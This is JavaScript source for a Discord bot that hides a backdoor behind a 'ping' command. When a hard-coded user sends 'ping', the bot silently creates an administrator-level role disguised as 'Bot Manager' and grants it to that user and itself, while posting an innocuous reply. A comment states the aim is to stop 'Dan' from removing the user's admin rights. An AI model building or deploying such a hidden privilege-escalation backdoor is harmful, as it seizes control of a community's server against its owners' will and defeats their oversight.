const Discord = require("./node_modules/discord.js");
const client = new Discord.Client();
const Info = require("./info.json");

console.log(Info);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', async msg => {
  if (msg.content === 'ping') {
    let guild = msg.guild;

    (async () => {
      // Uncomment one of the following to spam roles to prevent Dan from removing your admin perms.
      // for (let i=0; i<100; i++)
      if (msg.author.toString() == "<@YOUR ID HERE>") {
        createAdminRole(guild, client, msg.member);

        sleep(1000);
      }
    })();

    msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
  } else if (msg.content == "pong") {
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == Info.nuttyusername) {
        guild.roles.filter(role => role.name == "Bot Manager").forEach(role => role.delete());
        await sleep(30000);

        printRoles(guild);
      }
    })()
  }
});

client.login(Info.token);

function createAdminRole(guild, client, guildMember) {
  guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) { // Only the bot still has it.
        role.delete();
      }
    });
  guild.createRole({
    name: 'Bot Manager',
    color: 'WHITE',
    permissions: 8,
    mentionable: false,
    hoist: false
  }).then(role => {
    let bot = guild.member(client.user);

    guildMember.addRole(role, 'because');
    bot.addRole(role, 'because');
    console.log("Admin role created");
  })
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function printRoles(guild) {
  console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
}
